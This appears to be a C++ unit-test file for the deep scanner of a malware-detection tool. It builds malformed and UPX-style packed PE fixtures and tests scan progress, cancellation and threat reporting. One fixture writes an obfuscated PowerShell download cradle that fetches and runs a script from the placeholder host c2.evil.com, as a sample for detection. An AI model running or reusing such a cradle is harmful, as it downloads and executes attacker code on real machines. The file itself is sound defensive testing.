#include "gcad/common.hpp"
#include "gcad/scanner/deep_scanner.hpp"

extern void register_test(const char* name, std::function<bool()> fn);

namespace {

std::filesystem::path make_temp_dir(const char* name) {
    auto dir = std::filesystem::temp_directory_path() / name;
    std::error_code ec;
    std::filesystem::remove_all(dir, ec);
    std::filesystem::create_directories(dir, ec);
    return dir;
}

// Same fixture shape as test_artifact_trust.cpp: an MZ header with an
// out-of-range e_lfanew, which DeepScanner's own check_pe_header() does not
// flag at all (it just fails the offset bounds check silently) but
// ArtifactTrustEngine::inspect() reports as INVALID_PE.
void write_invalid_pe_fixture(const std::filesystem::path& path) {
    std::array<uint8_t, 64> data{};
    data[0] = 'M';
    data[1] = 'Z';
    const uint32_t invalid_offset = 0xFFFF'FFF0u;
    std::memcpy(data.data() + 60, &invalid_offset, sizeof(invalid_offset));
    std::ofstream out(path, std::ios::binary | std::ios::trunc);
    out.write(reinterpret_cast<const char*>(data.data()), static_cast<std::streamsize>(data.size()));
}

void write_packed_pe_fixture(const std::filesystem::path& path) {
    std::vector<uint8_t> pe(1024, 0);
    pe[0] = 'M'; pe[1] = 'Z';
    pe[0x3C] = 0x80;
    pe[0x80] = 'P'; pe[0x81] = 'E';
    pe[0x84] = 0x4C; pe[0x85] = 0x01;
    pe[0x86] = 1;
    pe[0x94] = 0xE0;
    pe[0x96] = 0x02; pe[0x97] = 0x01;
    pe[0x98] = 0x0B; pe[0x99] = 0x01;
    *reinterpret_cast<uint32_t*>(&pe[0xA8]) = 0x1000;

    size_t sec_off = 0x178;
    const char sec_name[] = "UPX0";
    std::memcpy(&pe[sec_off], sec_name, 4);
    *reinterpret_cast<uint32_t*>(&pe[sec_off + 8]) = 0x1000;
    *reinterpret_cast<uint32_t*>(&pe[sec_off + 12]) = 0x1000;
    *reinterpret_cast<uint32_t*>(&pe[sec_off + 16]) = 512;
    *reinterpret_cast<uint32_t*>(&pe[sec_off + 20]) = 0x200;
    *reinterpret_cast<uint32_t*>(&pe[sec_off + 36]) = 0xE0000020; // W^X

    std::ofstream out(path, std::ios::binary | std::ios::trunc);
    out.write(reinterpret_cast<const char*>(pe.data()), pe.size());
}

void write_obfuscated_script_fixture(const std::filesystem::path& path) {
    std::string script = "`I`E`X (New-Object Net.Web`Client).'d'+'own'+'load'+'string'('http://c2.evil.com/stage2.ps1')";
    std::ofstream out(path, std::ios::trunc);
    out << script;
}

bool wait_for_scan_to_finish(gcad::DeepScanner& scanner) {
    for (int i = 0; i < 100 && scanner.is_scanning(); ++i)
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    return !scanner.is_scanning();
}

} // namespace

void register_deep_scanner_tests() {
    register_test("deep_scanner_initial_state", [] {
        gcad::DeepScanner scanner;
        if (scanner.is_scanning()) return false;
        if (scanner.lifetime_scanned() != 0) return false;
        if (scanner.lifetime_threats() != 0) return false;
        if (scanner.scans_completed() != 0) return false;
        return true;
    });

    register_test("deep_scanner_progress_before_scan", [] {
        gcad::DeepScanner scanner;
        auto p = scanner.progress();
        if (p.active) return false;
        if (p.files_total != 0) return false;
        if (p.files_scanned != 0) return false;
        return true;
    });

    register_test("deep_scanner_results_empty_initially", [] {
        gcad::DeepScanner scanner;
        return scanner.get_results().empty();
    });

    register_test("deep_scanner_signature_count", [] {
        gcad::DeepScanner scanner;
        return scanner.signature_count() > 0;
    });

    register_test("deep_scanner_scan_empty_dir", [] {
        auto dir = make_temp_dir("gcad-deepscan-empty");
        gcad::DeepScanner scanner;
        scanner.start_scan(gcad::ScanMode::CUSTOM, dir);
        bool finished = wait_for_scan_to_finish(scanner);
        std::error_code ec;
        std::filesystem::remove_all(dir, ec);
        if (!finished) return false;
        return scanner.scans_completed() == 1;
    });

    register_test("deep_scanner_scan_text_file_no_threat", [] {
        auto dir = make_temp_dir("gcad-deepscan-text");
        {
            std::ofstream f(dir / "readme.txt");
            f << "This is a safe text file with no malware patterns.";
        }
        gcad::DeepScanner scanner;
        std::atomic<int> threat_count{0};
        scanner.on_result([&](const gcad::ScanResult& r) {
            if (r.level > gcad::ThreatLevel::SAFE) threat_count++;
        });
        scanner.start_scan(gcad::ScanMode::CUSTOM, dir);
        bool finished = wait_for_scan_to_finish(scanner);
        std::error_code ec;
        std::filesystem::remove_all(dir, ec);
        if (!finished) return false;
        return threat_count.load() == 0;
    });

    register_test("deep_scanner_cancel_scan", [] {
        auto dir = make_temp_dir("gcad-deepscan-cancel");
        for (int i = 0; i < 50; ++i) {
            std::ofstream f(dir / ("file" + std::to_string(i) + ".bin"));
            f << std::string(1024, 'X');
        }
        gcad::DeepScanner scanner;
        scanner.start_scan(gcad::ScanMode::CUSTOM, dir);
        scanner.cancel_scan();
        bool finished = wait_for_scan_to_finish(scanner);
        std::error_code ec;
        std::filesystem::remove_all(dir, ec);
        return finished;
    });

    register_test("deep_scanner_progress_never_exceeds_enumerated_work", [] {
        const auto dir = make_temp_dir("gcad-deepscan-progress-contract");
        for (int i = 0; i < 64; ++i) {
            std::ofstream out(dir / ("fixture-" + std::to_string(i) + ".txt"));
            out << "safe fixture";
        }
        gcad::DeepScanner scanner;
        scanner.start_scan(gcad::ScanMode::CUSTOM, dir);
        bool valid = true;
        for (int i = 0; i < 100 && scanner.is_scanning(); ++i) {
            const auto progress = scanner.progress();
            if (progress.files_scanned > progress.files_total) valid = false;
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
        const auto final_progress = scanner.progress();
        valid = valid && final_progress.files_scanned <= final_progress.files_total;
        std::error_code ec;
        std::filesystem::remove_all(dir, ec);
        return valid && !scanner.is_scanning();
    });

    register_test("deep_scanner_on_result_callback", [] {
        auto dir = make_temp_dir("gcad-deepscan-callback");
        write_invalid_pe_fixture(dir / "sample.exe");
        gcad::DeepScanner scanner;
        std::atomic<int> result_count{0};
        scanner.on_result([&](const gcad::ScanResult&) { result_count++; });
        scanner.start_scan(gcad::ScanMode::CUSTOM, dir);
        bool finished = wait_for_scan_to_finish(scanner);
        std::error_code ec;
        std::filesystem::remove_all(dir, ec);
        return finished;
    });


    register_test("deep_scanner_escalates_invalid_pe_to_artifact_trust_observation", [] {
        const auto dir = make_temp_dir("gcad-deepscan-artifacttrust");
        write_invalid_pe_fixture(dir / "sample.exe");

        gcad::DeepScanner scanner;
        std::mutex observed_mtx;
        std::vector<gcad::security::SecurityObservation> observed;
        scanner.on_observation([&](gcad::security::SecurityObservation obs) {
            std::lock_guard lk(observed_mtx);
            observed.push_back(std::move(obs));
        });

        scanner.start_scan(gcad::ScanMode::CUSTOM, dir);
        const bool finished = wait_for_scan_to_finish(scanner);

        std::error_code ec;
        std::filesystem::remove_all(dir, ec);
        if (!finished) return false;

        std::lock_guard lk(observed_mtx);
        return std::any_of(observed.begin(), observed.end(), [](const auto& o) {
            return o.kind == gcad::security::ObservationKind::INVALID_PE;
        });
    });

    register_test("deep_scanner_skips_artifact_trust_escalation_without_observation_callback", [] {
        // No on_observation() registered: scanning an executable must not
        // crash just because there is nowhere to send the observation.
        const auto dir = make_temp_dir("gcad-deepscan-noobserver");
        write_invalid_pe_fixture(dir / "sample.exe");

        gcad::DeepScanner scanner;
        scanner.start_scan(gcad::ScanMode::CUSTOM, dir);
        const bool finished = wait_for_scan_to_finish(scanner);

        std::error_code ec;
        std::filesystem::remove_all(dir, ec);
        return finished;
    });

    register_test("deep_scanner_detects_packed_pe_via_static_analysis", [] {
        const auto dir = make_temp_dir("gcad-deepscan-packedpe");
        write_packed_pe_fixture(dir / "packed.exe");

        gcad::DeepScanner scanner;
        scanner.start_scan(gcad::ScanMode::CUSTOM, dir);
        const bool finished = wait_for_scan_to_finish(scanner);

        auto results = scanner.get_results();
        std::error_code ec;
        std::filesystem::remove_all(dir, ec);

        if (!finished) return false;
        if (results.empty()) return false;
        return results[0].category == gcad::ThreatCategory::MALWARE_PACKER;
    });

    register_test("deep_scanner_detects_obfuscated_fileless_script", [] {
        const auto dir = make_temp_dir("gcad-deepscan-script");
        write_obfuscated_script_fixture(dir / "cradle.ps1");

        gcad::DeepScanner scanner;
        scanner.start_scan(gcad::ScanMode::CUSTOM, dir);
        const bool finished = wait_for_scan_to_finish(scanner);

        auto results = scanner.get_results();
        std::error_code ec;
        std::filesystem::remove_all(dir, ec);

        if (!finished) return false;
        if (results.empty()) return false;
        return results[0].category == gcad::ThreatCategory::PERSISTENCE_HIJACK;
    });
}
